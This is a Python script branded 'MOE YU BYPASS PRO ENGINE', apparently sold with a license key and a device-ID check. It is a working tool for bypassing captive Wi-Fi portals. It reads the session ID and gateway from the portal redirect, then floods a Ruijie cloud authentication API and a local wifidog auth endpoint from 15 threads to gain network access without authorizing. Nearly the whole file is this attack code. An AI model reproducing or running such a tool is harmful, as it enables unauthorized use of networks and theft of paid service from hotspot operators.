import requests
import re
import urllib3
import time
import threading
import logging
import random
import sys
import datetime
import os
import uuid
from urllib.parse import urlparse, parse_qs, urljoin
from rich.console import Console
from rich.panel import Panel
from rich.align import Align
from rich.text import Text

# ===============================
# CONFIG & INITIALIZATION
# ===============================
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
console = Console()

PING_THREADS = 15
logging.basicConfig(level=logging.INFO, format="%(asctime)s | %(message)s", datefmt="%H:%M:%S")
stop_event = threading.Event()

# Color Codes
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"

# License Database URL
URL = "https://raw.githubusercontent.com/hhtethtet277-svg/my-database-/refs/heads/main/key.txt"

# အသစ်ပြင်ဆင်ထားသော LOGO
GREETING_LOGO = """
[bold cyan]
      _      
    _(_)_    
   (_)@(_)   [bold yellow] <( မင်္ဂလာပါ )[/bold yellow]
     (_)\  / 
      /  ||  
  ___/___||___
 |____________|
[/bold cyan]
"""

BANNER = """
[bold #00FF00]
 ╔╦╗╔═╗╔═╗  ╦ ╦╦ ╦
 ║║║║ ║║╣   ╚╦╝║ ║
 ╩ ╩╚═╝╚═╝   ╩ ╚═╝
      [#00FF00]M O E   Y U   H A C K E R[/#00FF00]
[/bold #00FF00]
"""

def get_hwid():
    id_file = os.path.expanduser("~/.moe_yu_id")
    try:
        if os.path.exists(id_file):
            with open(id_file, "r") as f: return f.read().strip()
        raw_id = str(uuid.uuid4()).split('-')[0].upper()
        new_id = f"MOE-{raw_id}-{random.randint(100, 999)}"
        with open(id_file, "w") as f: f.write(new_id)
        return new_id
    except: return "MOE-DEFAULT-999"

def check_expiry(expiry_str):
    if expiry_str.upper() in ["NONE", "LIFETIME", "FREE"]: return True, "Lifetime"
    try:
        expiry_date = datetime.datetime.strptime(expiry_str, '%Y-%m-%d')
        if datetime.datetime.now() > expiry_date: return False, expiry_date.strftime('%d-%b-%Y')
        return True, expiry_date.strftime('%d-%b-%Y')
    except: return True, "Lifetime"

def display_header():
    console.clear()
    console.print(Align.center(GREETING_LOGO))
    console.print(Align.center(BANNER))
    console.print(Align.center("[bold cyan]MOE YU BYPASS PRO ENGINE v5.5 (IP AUTO-DETECT)[/bold cyan]\n"))

def check_license():
    my_hwid = get_hwid()
    display_header()
    console.print(Align.center(Panel(f"[bold white]YOUR HWID: [yellow]{my_hwid}[/yellow][/bold white]", title="[bold red]DEVICE INFO[/bold red]", border_style="bold cyan", expand=False)))
    
    try: 
        user_key = input("\n  [SECURITY_ACCESS] @MoeYu_").strip()
        if not user_key: sys.exit()
        
        res = requests.get(URL, timeout=10)
        lines = [l.strip() for l in res.text.splitlines() if l.strip()]
        for entry in lines:
            parts = entry.split("|")
            if user_key == parts[0].strip():
                db_hwid = parts[2].strip() if len(parts) > 2 else "FREE"
                if db_hwid != "FREE" and db_hwid != my_hwid:
                    console.print("\n[bold red]❌ HWID MISMATCH![/bold red]")
                    sys.exit()
                is_active, date_label = check_expiry(parts[1].strip() if len(parts) > 1 else "None")
                if is_active:
                    console.print(f"\n[bold green]ACCESS_GRANTED! STATUS: {date_label}[/bold green]")
                    time.sleep(1)
                    return True
        console.print("\n[bold red]❌ INVALID KEY![/bold red]")
        sys.exit()
    except:
        console.print("\n[bold red]📡 CONNECTION ERROR![/bold red]")
        sys.exit()

# ===============================
# BYPASS ENGINE (IP DYNAMIC FIX)
# ===============================
def start_bypass_process():
    while not stop_event.is_set():
        try:
            session = requests.Session()
            session.verify = False
            session.headers.update({'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36'})

            # Step 1: Portal Detection & IP Auto-Detect
            r = session.get("http://connectivitycheck.gstatic.com/generate_204", timeout=5, allow_redirects=True)
            
            if r.status_code == 204:
                sys.stdout.write(f"{CYAN}[!] Internet is already connected...{RESET}\n")
                time.sleep(10)
                continue
            
            portal_url = r.url
            parsed_url = urlparse(portal_url)
            p = parse_qs(parsed_url.query)
            
            # IP Address ကို URL ထဲကနေ Auto ရှာဖွေခြင်း
            gw_addr = p.get('gw_address', [parsed_url.netloc.split(':')[0]])[0]
            gw_port = p.get('gw_port', ['2060'])[0]
            sid = p.get('sessionId', [None])[0]
            res_val = p.get('RES', [''])[0]

            if sid:
                # Cloud MACC API & Local Auth Paths
                cloud_auth = f"https://portal-as.ruijienetworks.com/api/maccauth/v2/login?sessionId={sid}&res={res_val}"
                local_auth = f"http://{gw_addr}:{gw_port}/wifidog/auth?token={sid}"
                
                console.print(f"[bold yellow]⚙️ BYPASSING IP: {gw_addr} | SID: {sid[:10]}[/bold yellow]")

                def pulse_ping():
                    while not stop_event.is_set():
                        try:
                            # Server နှစ်ခုလုံးဆီ Request ပို့ပြီး bypass လုပ်ခြင်း
                            session.get(cloud_auth, timeout=10)
                            session.get(local_auth, timeout=10)
                            sys.stdout.write(f"{GREEN}[✓] BYPASS ACTIVE | SESSION: {sid[:8]}{RESET}\n")
                            sys.stdout.flush()
                        except: pass
                        time.sleep(0.4)

                for _ in range(PING_THREADS):
                    threading.Thread(target=pulse_ping, daemon=True).start()
                
                # Connection Check
                while True:
                    try:
                        if requests.get("http://www.google.com", timeout=5).status_code == 200:
                            sys.stdout.write(f"{GREEN}[!] SUCCESS: BYPASS WORKING 🔥{RESET}\n")
                            time.sleep(20)
                        else: break
                    except: break
            else:
                sys.stdout.write(f"{YELLOW}[?] Waiting for Session ID (Please open Login Page in Browser)...{RESET}\n")
                time.sleep(5)

        except:
            time.sleep(5)

if __name__ == "__main__":
    try:
        if check_license():
            console.print(Panel(Align.center("[bold white]🔥 MOE YU BYPASS ACTIVATED 🔥[/bold white]"), border_style="bold red", expand=False))
            start_bypass_process()
    except KeyboardInterrupt:
        console.print("\n[bold red]Exiting...[/bold red]")
        sys.exit()
